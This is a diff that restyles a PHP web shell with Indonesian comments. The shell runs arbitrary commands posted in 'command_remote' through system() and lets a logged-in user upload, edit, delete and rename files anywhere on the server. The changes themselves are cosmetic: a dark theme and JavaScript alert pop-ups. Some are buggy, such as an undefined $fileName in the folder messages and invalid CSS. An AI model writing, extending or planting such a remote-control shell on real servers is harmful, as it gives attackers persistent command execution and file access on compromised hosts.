@@ -14,14 +14,15 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['command_remote'])) {
         chdir($target_dir);
     }
 
-    echo "Current Directory: " . getcwd() . "<br><br>";
+    echo "<style>body { font-family: 'Courier New', monospace, sans-serif; background-color: #2b2b2b; color: #f8f8f2; margin: 0; padding: 20px; line-height: 1.6; overflow: auto, hidden; scrollbar-width: none; -ms-overflow-style: none; } a { color:rgb(52, 175, 93); text-decoration: none; } a:hover { text-decoration: underline; }</style>";
+    echo "<body>Current Directory: " . getcwd() . "<br><br>";
 
     // Eksekusi perintah di direktori yang dipilih
     echo "<pre>";
     system(($command_remote) . " 2>&1");
     echo "</pre>";
 
-    echo "<a href=''>Back</a>";
+    echo "<a href=''>Back</a></body>";
     die;
 }
 
@@ -51,14 +52,17 @@ if (isset($_POST['username']) && isset($_POST['password'])) {
 }
 
 if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
-    echo '<div class="container">';
-    echo '<h1>Login</h1>';
-    echo '<form method="post">';
-    echo 'Username: <input type="text" name="username"><br>';
-    echo 'Password: <input type="password" name="password"><br>';
-    echo '<input type="submit" value="Login" class="button">';
-    echo '</form>';
-    echo '</div>';
+    echo "<style>body { font-family: 'Courier New', monospace, sans-serif; background-color: #2b2b2b; color: #f8f8f2; margin: 0; padding: 20px; line-height: 1.6; overflow: auto, hidden; scrollbar-width: none; -ms-overflow-style: none; } a { color:rgb(52, 175, 93); text-decoration: none; } a:hover { text-decoration: underline; }</style>";
+    echo '<body>';
+    echo '  <div class="container">';
+    echo '    <h1>Login</h1>';
+    echo '      <form method="post">';
+    echo '        Username: <input type="text" name="username"><br>';
+    echo '        Password: <input type="password" name="password"><br>';
+    echo '        <input type="submit" value="Login" class="button">';
+    echo '      </form>';
+    echo '  </div>';
+    echo '</body>';
     exit;
 }
 
@@ -135,18 +139,18 @@ function uploadFile($path) {
 
         // Check if file already exists
         if (file_exists($target_file)) {
-            echo 'Sorry, file already exists. <a href="?path=' . urlencode($target_dir) . '">Go back</a>';
+            echo "<script> alert('File already exists!.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
             $uploadOk = 0;
         }
 
         // Check if $uploadOk is set to 0 by an error
         if ($uploadOk == 0) {
-            echo 'Sorry, your file was not uploaded. <a href="?path=' . urlencode($target_dir) . '">Go back</a>';
+            echo "<script> alert('Sorry, your files are not uploaded.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
         } else {
             if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
-                echo "The file " . htmlspecialchars(basename($_FILES['uploaded_file']['name'])) . ' has been uploaded. <a href="?path=' . urlencode($target_dir) . '">Go back</a>';
+                echo "<script> alert('File " . htmlspecialchars(basename($_FILES['uploaded_file']['name'])) . " successfully uploaded!.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
             } else {
-                echo 'Sorry, there was an error uploading your file. <a href="?path=' . urlencode($target_dir) . '">Go back</a>';
+                echo "<script> alert('An error occurred while uploading your files.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
             }
         }
     }
@@ -156,9 +160,9 @@ function createNewFolder($path, $folderName) {
     $newFolder = $path . DIRECTORY_SEPARATOR . $folderName;
     if (!file_exists($newFolder)) {
         mkdir($newFolder, 0777, true);
-        echo 'Folder "' . htmlspecialchars($folderName) . '" created successfully. <a href="?path=' . urlencode($path) . '">Go back</a>';
+        echo "<script> alert('Folder " . htmlspecialchars($fileName) . " created succesfully!.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
     } else {
-        echo 'Folder "' . htmlspecialchars($folderName) . '" already exists. <a href="?path=' . urlencode($path) . '">Go back</a>';
+        echo "<script> alert('Folder " . htmlspecialchars($fileName) . " already exists!.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
     }
 }
 
@@ -167,9 +171,9 @@ function createNewFile($path, $fileName) {
     if (!file_exists($newFile)) {
         $fp = fopen($newFile, 'w');
         fclose($fp);
-        echo 'File ' . htmlspecialchars($fileName) . ' created successfully. <a href="?path=' . urlencode($path) . '">Go back</a>';
+        echo "<script> alert('File " . htmlspecialchars($fileName) . " created succesfully!.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
     } else {
-        echo 'File ' . htmlspecialchars($fileName) . ' already exists. <a href="?path=' . urlencode($path) . '">Go back</a>';
+        echo "<script> alert('File " . htmlspecialchars($fileName) . " already exists!.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
     }
 }
 
@@ -190,10 +194,13 @@ if ($action === 'delete' && isset($_GET['dir'])) {
 
 // Proses rename folder
 if ($action === 'rename' && isset($_GET['dir'])) {
-    echo "<form method='post'>
-            <input type='text' name='new_name' placeholder='Nama baru' required>
-            <button type='submit' name='rename'>Rename</button>
-          </form>";
+    echo "<style>body { font-family: 'Courier New', monospace, sans-serif; background-color: #2b2b2b; color: #f8f8f2; margin: 0; padding: 20px; line-height: 1.6; overflow: auto, hidden; scrollbar-width: none; -ms-overflow-style: none; } a { color:rgb(52, 175, 93); text-decoration: none; } a:hover { text-decoration: underline; }</style>";
+    echo "<body>
+            <form method='post'>
+              <input type='text' name='new_name' placeholder='Nama baru' required>
+              <button type='submit' name='rename'>Rename</button>
+            </form>
+          </body>";
     if (isset($_POST['rename'])) {
         $newPath = dirname($_GET['dir']) . '/' . basename($_POST['new_name']);
         rename($_GET['dir'], $newPath);
@@ -212,7 +219,7 @@ if ($action === 'create_folder') {
     if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
         createNewFolder($path, $_POST['folder_name']);
     } else {
-        echo 'Folder name cannot be empty. <a href="?path=' . urlencode($path) . '">Go back</a>';
+        echo "<script> alert('Folder name cannot be empty.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
     }
     exit;
 }
@@ -221,7 +228,7 @@ if ($action === 'create_file') {
     if (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
         createNewFile($path, $_POST['file_name']);
     } else {
-        echo 'File name cannot be empty. <a href="?path=' . urlencode($path) . '">Go back</a>';
+        echo "<script> alert('File name cannot be empty.'); window.location.href = '?path=" . urlencode($path) . "'; </script>";
     }
     exit;
 }
@@ -229,16 +236,17 @@ if ($action === 'create_file') {
 if ($action === 'edit' && !empty($file)) {
     if (isset($_POST['content'])) {
         file_put_contents($file, $_POST['content']);
-        echo 'File saved! <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
+        echo "<script> alert('File successfully saved!'); window.location.href = window.location.href; </script>";
     } else {
         $content = file_get_contents($file);
+        echo "<style>body { font-family: 'Courier New', monospace, sans-serif; background-color: #2b2b2b; color: #f8f8f2; margin: 0; padding: 20px; line-height: 1.6; overflow: auto, hidden; scrollbar-width: none; -ms-overflow-style: none; } a { color:rgb(52, 175, 93); text-decoration: none; } a:hover { text-decoration: underline; }</style>";
         echo '<body>';
-        echo '<h1>Edit File: ' . basename($file) . '</h1>';
-        echo '<form method="post">';
-        echo '<textarea name="content" rows="40" cols="175">' . htmlspecialchars($content) . '</textarea><br>';
-        echo '<input type="submit" value="Save">';
-        echo '</form>';
-        echo '<a href="?path=' . urlencode($path) . '">Cancel</a>';
+        echo '    <h1>Edit File: ' . basename($file) . '</h1>';
+        echo '    <form method="post">';
+        echo '        <textarea name="content" rows="40" cols="175">' . htmlspecialchars($content) . '</textarea><br>';
+        echo '        <input type="submit" value="Save">';
+        echo '    </form>';
+        echo '    <a href="?path=' . urlencode($path) . '">Cancel</a>';
         echo '</body>';
     }
     exit;
@@ -247,9 +255,9 @@ if ($action === 'edit' && !empty($file)) {
 if ($action === 'delete' && !empty($file)) {
     if (is_file($file)) {
         unlink($file);
-        echo 'File deleted! <a href="?path=' . urlencode($path) . '">Go back</a>';
+        echo "<script> alert('File successfully deleted!'); window.location.href = window.location.href = '?path=" . urlencode($path) . "'; </script>";
     } else {
-        echo 'Invalid file. <a href="?path=' . urlencode($path) . '">Go back</a>';
+        echo "<script> alert('Invalid file!'); </script>";
     }
     exit;
 }
@@ -258,14 +266,17 @@ if ($action === 'rename' && !empty($file)) {
     if (isset($_POST['new_name'])) {
         $newName = dirname($file) . DIRECTORY_SEPARATOR . $_POST['new_name'];
         rename($file, $newName);
-        echo 'File renamed! <a href="?path=' . urlencode($path) . '">Go back</a>';
+        echo "<script> alert('File successfully renamed!'); window.location.href = window.location.href; </script>";
     } else {
+        echo "<style>body { font-family: 'Courier New', monospace, sans-serif; background-color: #2b2b2b; color: #f8f8f2; margin: 0; padding: 20px; line-height: 1.6; overflow: auto, hidden; scrollbar-width: none; -ms-overflow-style: none; } a { color:rgb(52, 175, 93); text-decoration: none; } a:hover { text-decoration: underline; }</style>";
+        echo '<body>';
         echo '<h1>Rename File: ' . basename($file) . '</h1>';
         echo '<form method="post">';
         echo '<input type="text" name="new_name" value="' . basename($file) . '"><br>';
         echo '<input type="submit" value="Rename">';
         echo '</form>';
         echo '<a href="?path=' . urlencode($path) . '">Cancel</a>';
+        echo '</body>';
     }
     exit;
 }
